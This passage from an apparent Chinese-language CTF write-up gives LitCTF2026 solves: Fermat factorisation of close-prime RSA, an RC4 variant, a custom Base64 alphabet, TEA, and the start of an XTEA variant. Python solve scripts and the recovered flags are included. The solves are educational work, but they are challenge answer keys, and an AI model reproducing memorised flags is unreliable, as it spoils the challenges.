+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">a = (p + q) / 2<br>b = (q - p) / 2<br></code></pre></td></tr></table></figure>
+
+<p>所以只需要从 <code>ceil(sqrt(n))</code> 开始枚举 <code>a</code>，判断：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">a^2 - n<br></code></pre></td></tr></table></figure>
+
+<p>是否是完全平方数。</p>
+<p>如果是完全平方数，设：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">b^2 = a^2 - n<br></code></pre></td></tr></table></figure>
+
+<p>那么：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">p = a - b<br>q = a + b<br></code></pre></td></tr></table></figure>
+
+<p>得到 <code>p</code> 和 <code>q</code> 后，就可以正常计算：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">phi = (p - 1) * (q - 1)<br>d = e^(-1) mod phi<br>m = c^d mod n<br></code></pre></td></tr></table></figure>
+
+<p>最后把整数转成 bytes 即可得到 flag。</p>
+<hr>
+<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> isqrt<br><br>n = <span class="hljs-number">139637440016232025690294457609899605991056011052010466558411851317943636600860419882966079629826706361935550982744312593243181819999590825159611186779613601241742349986440676188542381451066058816661317621009248513651083772907520139375108426466691332559612971244160246310746215067136490772061317571744230078911</span><br>c = <span class="hljs-number">81172369642931859390486697024961350889751244109623802937988620847486863147682579984823958801948701482096140632580173113959531836503723522945335985723867818778699337807630592078265626995722998378992215523352858561923474395550395284015986525513984910021995657780411466237306614109262460764382539311725297619429</span><br>e = <span class="hljs-number">65537</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">long_to_bytes</span>(<span class="hljs-params">x: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-keyword">return</span> x.to_bytes((x.bit_length() + <span class="hljs-number">7</span>) // <span class="hljs-number">8</span>, <span class="hljs-string">&quot;big&quot;</span>)<br><br><br>a = isqrt(n)<br><span class="hljs-keyword">if</span> a * a &lt; n:<br>    a += <span class="hljs-number">1</span><br><br>cnt = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    b2 = a * a - n<br>    b = isqrt(b2)<br><br>    <span class="hljs-keyword">if</span> b * b == b2:<br>        p = a - b<br>        q = a + b<br>        <span class="hljs-keyword">break</span><br><br>    a += <span class="hljs-number">1</span><br>    cnt += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Fermat iterations:&quot;</span>, cnt)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] p =&quot;</span>, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] q =&quot;</span>, q)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] q - p =&quot;</span>, q - p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] check:&quot;</span>, p * q == n)<br><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = long_to_bytes(m)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] flag =&quot;</span>, flag.decode())<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="运行结果-3"><a href="#运行结果-3" class="headerlink" title="运行结果"></a>运行结果</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[+] Fermat iterations: 0<br>[+] q - p = 1135234<br>[+] check: True<br>[+] flag = litctf&#123;rsa_fermat_finds_close_primes&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">litctf&#123;rsa_fermat_finds_close_primes&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="LitCTF2026-lit-rc4-variant"><a href="#LitCTF2026-lit-rc4-variant" class="headerlink" title="[LitCTF2026] lit_rc4_variant"></a>[LitCTF2026] lit_rc4_variant</h3><h4 id="题目信息-1"><a href="#题目信息-1" class="headerlink" title="题目信息"></a>题目信息</h4><p>题目给出的核心描述是：程序实现了一种 64 字节状态的流密码式异或。</p>
+<p>该算法整体结构和 RC4 类似，但是有两个明显变化：</p>
+<ol>
+<li>状态表大小不是 256，而是 64。</li>
+<li>输出字节不是标准 RC4 的 <code>S[(S[i] + S[j]) &amp; 255]</code>，而是和 <code>S[v7] + S[v10]</code> 相关的异或变体。</li>
+</ol>
+<p>密钥为 ASCII 字符串，放在 <code>.rdata</code> 段中。</p>
+<h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>将程序放入 IDA &#x2F; Ghidra 分析后，可以看到主逻辑会先读取输入，再判断输入长度。</p>
+<p>关键位置可以看到长度比较：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">cmp rax, 0x1d<br></code></pre></td></tr></table></figure>
+
+<p>因此 flag 长度为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0x1d = 29<br></code></pre></td></tr></table></figure>
+
+<p>继续查看 <code>.rdata</code> 段，可以看到程序中的提示字符串和关键数据：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">input your flag:<br>Wrong!<br>Good!<br></code></pre></td></tr></table></figure>
+
+<p>同时在 <code>.rdata</code> 附近可以定位到密文和密钥：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">g_cipher = 7b 3d 38 77 4e 72 42 7d 45 37 76 0f 53 53 4f 66 37 17 75 37 5f 49 58 72 74 7f 79 1f 3a<br>g_key    = lit_rc4_key!<br></code></pre></td></tr></table></figure>
+
+<p>密文长度正好是 <code>0x1d</code>，与前面的输入长度检查一致。</p>
+<h4 id="算法还原"><a href="#算法还原" class="headerlink" title="算法还原"></a>算法还原</h4><p>程序初始化了一个 64 字节状态表：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">S = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, ..., <span class="hljs-number">63</span>]<br></code></pre></td></tr></table></figure>
+
+<p>KSA 部分类似 RC4，但是取模使用的是 64：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">64</span><br>swap(S[i], S[j])<br></code></pre></td></tr></table></figure>
+
+<p>PRGA 部分同样使用 64 字节状态表。需要注意的是，它不是标准 RC4 的输出方式。</p>
+<p>标准 RC4 通常是：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ks = S[(S[i] + S[j]) &amp; <span class="hljs-number">0xff</span>]<br></code></pre></td></tr></table></figure>
+
+<p>本题变体中，输出逻辑与交换后的状态值加法有关。按照反编译逻辑还原后，可以得到密钥流字节，再与密文异或恢复明文。</p>
+<p>由于加密是异或形式，所以解密只需要用同样的密钥流再次异或密文即可。</p>
+<h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>():<br>    exe = Path(<span class="hljs-string">&quot;challenge.exe&quot;</span>)<br>    data = exe.read_bytes()<br><br>    <span class="hljs-comment"># .rdata 文件偏移：0x10a00</span><br>    <span class="hljs-comment"># g_cipher 位于 .rdata + 0x30，长度 0x1d</span><br>    <span class="hljs-comment"># g_key    位于 .rdata + 0x50</span><br>    cipher = data[<span class="hljs-number">0x10a30</span>:<span class="hljs-number">0x10a30</span> + <span class="hljs-number">0x1d</span>]<br>    key = data[<span class="hljs-number">0x10a50</span>:<span class="hljs-number">0x10a50</span> + <span class="hljs-number">12</span>]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] key =&quot;</span>, key.decode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] cipher =&quot;</span>, cipher.<span class="hljs-built_in">hex</span>())<br><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>))<br><br>    <span class="hljs-comment"># KSA: RC4-like，但是模 64</span><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">64</span><br>        S[i], S[j] = S[j], S[i]<br><br>    <span class="hljs-comment"># PRGA: 还原变体输出</span><br>    out = []<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">64</span><br>        old_si = S[i]<br><br>        j = (j + old_si) % <span class="hljs-number">64</span><br>        old_sj = S[j]<br><br>        S[i], S[j] = S[j], S[i]<br><br>        idx = (old_si + old_sj) &amp; <span class="hljs-number">0x3f</span><br>        ks = (S[i] + S[idx]) &amp; <span class="hljs-number">0xff</span><br><br>        out.append(c ^ ks)<br><br>    flag = <span class="hljs-built_in">bytes</span>(out)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] flag =&quot;</span>, flag.decode())<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solve()<br></code></pre></td></tr></table></figure>
+
+<h4 id="运行结果-4"><a href="#运行结果-4" class="headerlink" title="运行结果"></a>运行结果</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">[+] key = lit_rc4_key!<br>[+] cipher = 7b3d38774e72427d4537760f53534f66371775375f495872747f791f3a<br>[+] flag = LitCTF&#123;rev05_rc4_variant_64!&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">LitCTF&#123;rev05_rc4_variant_64!&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-b64-alphabet"><a href="#LitCTF2026-lit-b64-alphabet" class="headerlink" title="[LitCTF2026] lit_b64_alphabet"></a>[LitCTF2026] lit_b64_alphabet</h3><h4 id="题目信息-2"><a href="#题目信息-2" class="headerlink" title="题目信息"></a>题目信息</h4><p>题目描述：程序把输入的 flag 按标准 Base64 的分组方式编码，但是 64 个输出字符的字母表不是 RFC 默认顺序，而是程序里保存的一串置换。最后将编码结果与内存中的期望密文字符串比较。</p>
+<p>题目类型：Reverse</p>
+<p>核心点：自定义 Base64 字母表还原</p>
+<h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>程序整体逻辑不是复杂加密，而是把输入按 Base64 的方式分组编码。区别在于编码时使用的 Base64 字符表被替换成了程序内置的一串置换表。</p>
+<p>标准 Base64 字符表为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/<br></code></pre></td></tr></table></figure>
+
+<p>程序中的自定义字符表为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">2KuEphj84USZF67iloxzfYd+MrDgRG9yLwBnHAXcJq3eCN/s1bOQ5TvPa0tVkWmI<br></code></pre></td></tr></table></figure>
+
+<p>内存中的期望密文字符串为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">zjA5lToj9PUAGn2O+v6TRPosgYWB6noyGjhBgjfwyl==<br></code></pre></td></tr></table></figure>
+
+<p>因此不需要爆破。只要把期望密文中每个字符在自定义字符表里的下标找出来，再映射回标准 Base64 字符表相同下标的字符，就能得到标准 Base64 字符串。</p>
+<p>恢复后得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">TGl0Q1RGe3JldjAyX2N1c3RvbV9iNjRfdGFibGUhfQ==<br></code></pre></td></tr></table></figure>
+
+<p>再进行标准 Base64 解码即可得到 flag。</p>
+<h4 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>std = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>custom = <span class="hljs-string">&quot;2KuEphj84USZF67iloxzfYd+MrDgRG9yLwBnHAXcJq3eCN/s1bOQ5TvPa0tVkWmI&quot;</span><br><br>cipher = <span class="hljs-string">&quot;zjA5lToj9PUAGn2O+v6TRPosgYWB6noyGjhBgjfwyl==&quot;</span><br><br>normal_b64 = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> cipher:<br>    <span class="hljs-keyword">if</span> ch == <span class="hljs-string">&quot;=&quot;</span>:<br>        normal_b64 += <span class="hljs-string">&quot;=&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        idx = custom.index(ch)<br>        normal_b64 += std[idx]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] restored base64:&quot;</span>, normal_b64)<br><br>flag = base64.b64decode(normal_b64).decode()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] flag:&quot;</span>, flag)<br></code></pre></td></tr></table></figure>
+
+<h4 id="运行结果-5"><a href="#运行结果-5" class="headerlink" title="运行结果"></a>运行结果</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">[+] restored base64: TGl0Q1RGe3JldjAyX2N1c3RvbV9iNjRfdGFibGUhfQ==<br>[+] flag: LitCTF&#123;rev02_custom_b64_table!&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">LitCTF&#123;rev02_custom_b64_table!&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-tea-standard"><a href="#LitCTF2026-lit-tea-standard" class="headerlink" title="[LitCTF2026] lit_tea_standard"></a>[LitCTF2026] lit_tea_standard</h3><h4 id="题目信息-3"><a href="#题目信息-3" class="headerlink" title="题目信息"></a>题目信息</h4><p>程序把输入的 flag 先做 PKCS#7 填充到 8 字节倍数，然后按 8 字节分块进行标准 TEA 加密。</p>
+<p>TEA 参数如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">轮数：32<br>分组大小：8 字节<br>delta：0x9E3779B9<br>key：4 个 uint32，小端存放在 .rdata<br></code></pre></td></tr></table></figure>
+
+<p>程序最后会把加密结果和内存中的密文逐字节比较，所以只要从程序中提取 key 和密文，再反向 TEA 解密即可。</p>
+<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>用 IDA 查看程序逻辑，可以看到主流程大致为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">read input<br>PKCS#<span class="hljs-number">7</span> padding<br><span class="hljs-keyword">for</span> each <span class="hljs-number">8</span>-byte block:<br>    TEA_encrypt(block, key)<br>compare encrypted result with cipher<br></code></pre></td></tr></table></figure>
+
+<p>加密函数是标准 TEA 结构，循环 32 轮，轮常数为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0x9E3779B9<br></code></pre></td></tr></table></figure>
+
+<p>不是 XTEA，也不是改 delta 的变种。</p>
+<p>在 <code>.rdata</code> 中可以找到 4 个 <code>uint32</code> 形式的 key。反汇编里有些值会显示成负数，转成无符号 32 位后为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">k[0] = 0xA11CEFAC<br>k[1] = 0xB00B1E00<br>k[2] = 0xCAFEBABE<br>k[3] = 0xDEADBEEF<br></code></pre></td></tr></table></figure>
+
+<p>程序中用于比较的密文为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">ed ef 21 fe b7 9b 3c b0<br>1e 93 72 e2 02 3e 29 bc<br>36 f7 0c 92 2e 5a ae 46<br>44 fa 45 25 1a e5 8c 87<br></code></pre></td></tr></table></figure>
+
+<p>因为输入加密后和这段密文比较，所以直接对密文按 TEA 解密，最后去掉 PKCS#7 padding。</p>
+<h4 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>MASK = <span class="hljs-number">0xffffffff</span><br>DELTA = <span class="hljs-number">0x9E3779B9</span><br><br>cipher = <span class="hljs-built_in">bytes</span>.fromhex(<br>    <span class="hljs-string">&quot;ed ef 21 fe b7 9b 3c b0&quot;</span><br>    <span class="hljs-string">&quot;1e 93 72 e2 02 3e 29 bc&quot;</span><br>    <span class="hljs-string">&quot;36 f7 0c 92 2e 5a ae 46&quot;</span><br>    <span class="hljs-string">&quot;44 fa 45 25 1a e5 8c 87&quot;</span><br>)<br><br>key = [<br>    <span class="hljs-number">0xA11CEFAC</span>,<br>    <span class="hljs-number">0xB00B1E00</span>,<br>    <span class="hljs-number">0xCAFEBABE</span>,<br>    <span class="hljs-number">0xDEADBEEF</span>,<br>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tea_decrypt_block</span>(<span class="hljs-params">block: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    v0, v1 = struct.unpack(<span class="hljs-string">&quot;&lt;2I&quot;</span>, block)<br>    s = (DELTA * <span class="hljs-number">32</span>) &amp; MASK<br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v1 = (v1 - (<br>            (((v0 &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">2</span>]) &amp; MASK)<br>            ^ ((v0 + s) &amp; MASK)<br>            ^ (((v0 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">3</span>]) &amp; MASK)<br>        )) &amp; MASK<br><br>        v0 = (v0 - (<br>            (((v1 &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">0</span>]) &amp; MASK)<br>            ^ ((v1 + s) &amp; MASK)<br>            ^ (((v1 &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">1</span>]) &amp; MASK)<br>        )) &amp; MASK<br><br>        s = (s - DELTA) &amp; MASK<br><br>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&lt;2I&quot;</span>, v0, v1)<br><br><br>plain = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher), <span class="hljs-number">8</span>):<br>    plain += tea_decrypt_block(cipher[i:i + <span class="hljs-number">8</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] decrypted with padding:&quot;</span>, plain)<br><br>pad = plain[-<span class="hljs-number">1</span>]<br>flag = plain[:-pad]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] padding =&quot;</span>, pad)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] flag =&quot;</span>, flag.decode())<br></code></pre></td></tr></table></figure>
+
+<h4 id="运行结果-6"><a href="#运行结果-6" class="headerlink" title="运行结果"></a>运行结果</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">[+] decrypted with padding: b&#x27;LitCTF&#123;rev03_tea_standard!!&#125;\x04\x04\x04\x04&#x27;<br>[+] padding = 4<br>[+] flag = LitCTF&#123;rev03_tea_standard!!&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">LitCTF&#123;rev03_tea_standard!!&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-xtea-tweak"><a href="#LitCTF2026-lit-xtea-tweak" class="headerlink" title="[LitCTF2026] lit_xtea_tweak"></a>[LitCTF2026] lit_xtea_tweak</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>程序流程和常见的「分组 + 填充 + 分块加密」类似，整体结构接近 XTEA。<br>不同点在于轮常数 <code>delta</code> 被改成了 <code>0xDEADBEEF</code>，而不是标准 XTEA 常见的 <code>0x9E3779B9</code>。<br>如果直接套网上的 XTEA 解密脚本，仍然使用标准 <code>delta</code>，解密结果会失败。</p>
+<p>附件中主要文件：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">challenge.exe<br></code></pre></td></tr></table></figure>
+
+<h4 id="分析过程-1"><a href="#分析过程-1" class="headerlink" title="分析过程"></a>分析过程</h4><p>把 <code>challenge.exe</code> 放进 IDA &#x2F; Ghidra 里查看主逻辑，可以看到程序读取输入后，并不是直接比较明文，而是先对输入做填充，再按 8 字节一组进行加密。</p>
+<p>加密流程大致为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">输入 flag<br>    ↓<br>PKCS#7 填充到 8 字节倍数<br>    ↓<br>每 8 字节作为一个 block<br>    ↓<br>使用类似 XTEA 的 32 轮加密<br>    ↓<br>和内存中的密文数组逐字节比较<br></code></pre></td></tr></table></figure>
+
+<p>继续跟进加密函数，能看到每轮都会更新 <code>sum</code>，但是这里使用的常数不是标准 XTEA 的 <code>0x9E3779B9</code>，而是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sum += <span class="hljs-number">0xDEADBEEF</span>;<br></code></pre></td></tr></table></figure>
+
+<p>所以解密时也必须使用相同的 <code>delta = 0xDEADBEEF</code>。</p>
+<h4 id="关键数据"><a href="#关键数据" class="headerlink" title="关键数据"></a>关键数据</h4><p>在程序的数据区中可以找到密钥和目标密文。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">g_cipher = e3ee1ee7d3a7966fc6a7b9e1b94e67865f0304a6dbbbb940563af79eee64d406<br>g_key    = 11111111 22222222 33333333 44444444<br></code></pre></td></tr></table></figure>
+
+<p>按小端序解析后，密钥为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-number">0x11111111</span>, <span class="hljs-number">0x22222222</span>, <span class="hljs-number">0x33333333</span>, <span class="hljs-number">0x44444444</span>]<br></code></pre></td></tr></table></figure>
+
